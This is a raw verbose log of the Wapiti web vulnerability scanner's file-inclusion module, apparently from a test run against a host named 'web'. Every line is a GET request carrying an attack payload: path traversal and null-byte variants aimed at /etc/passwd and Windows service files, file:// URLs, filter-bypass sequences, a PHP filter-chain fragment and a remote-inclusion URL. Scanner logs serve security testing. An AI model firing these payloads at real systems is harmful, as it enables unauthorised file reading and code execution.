FT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp&hc_action=delete_xml (0)
2024-03-21 15:50:27.523 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz&result=success%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&hc_action=delete_xml (0)
2024-03-21 15:50:29.236 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz&result=success%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&hc_action=delete_xml (0)
2024-03-21 15:50:30.945 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz&result=success%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&hc_action=delete_xml (0)
2024-03-21 15:50:32.662 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz&result=success%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&hc_action=delete_xml (0)
2024-03-21 15:50:34.361 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz&result=success%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&hc_action=delete_xml (0)
2024-03-21 15:50:36.066 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz&result=success%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&hc_action=delete_xml (0)
2024-03-21 15:50:37.761 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz&result=success%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&hc_action=delete_xml (0)
2024-03-21 15:50:39.461 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz&result=success%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&hc_action=delete_xml (0)
2024-03-21 15:50:41.174 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz&result=success%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&hc_action=delete_xml (0)
2024-03-21 15:50:42.880 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz&result=success%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&hc_action=delete_xml (0)
2024-03-21 15:50:44.578 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz&result=success%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&hc_action=delete_xml (0)
2024-03-21 15:50:46.285 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz&result=success%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&hc_action=delete_xml (0)
2024-03-21 15:50:47.983 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz&result=success%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&hc_action=delete_xml (0)
2024-03-21 15:50:49.683 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz&result=success%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&hc_action=delete_xml (0)
2024-03-21 15:50:51.392 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz&result=success%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&hc_action=delete_xml (0)
2024-03-21 15:50:53.097 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz&result=success%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&hc_action=delete_xml (0)
2024-03-21 15:50:54.816 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz&result=success%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&hc_action=delete_xml (0)
2024-03-21 15:50:56.537 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz&result=success%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&hc_action=delete_xml (0)
2024-03-21 15:50:58.233 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz&result=success%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&hc_action=delete_xml (0)
2024-03-21 15:50:59.929 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz&result=success%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&hc_action=delete_xml (0)
2024-03-21 15:51:01.706 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz&result=success%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&hc_action=delete_xml (0)
2024-03-21 15:51:03.413 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz&result=success%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&hc_action=delete_xml (0)
2024-03-21 15:51:05.109 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz&result=success%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&hc_action=delete_xml (0)
2024-03-21 15:51:06.821 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz&result=success%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&hc_action=delete_xml (0)
2024-03-21 15:51:08.504 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz&result=file%3A%2F%2F%2Fetc%2Fpasswd&hc_action=delete_xml (0)
2024-03-21 15:51:10.221 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz&result=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&hc_action=delete_xml (0)
2024-03-21 15:51:11.929 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz&result=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd&hc_action=delete_xml (0)
2024-03-21 15:51:13.629 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz&result=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00&hc_action=delete_xml (0)
2024-03-21 15:51:15.322 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz&result=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices&hc_action=delete_xml (0)
2024-03-21 15:51:17.029 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz&result=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00&hc_action=delete_xml (0)
2024-03-21 15:51:18.739 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz&result=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&hc_action=delete_xml (0)
2024-03-21 15:51:20.444 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz&result=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&hc_action=delete_xml (0)
2024-03-21 15:51:22.152 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz&result=success&hc_action=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php (0)
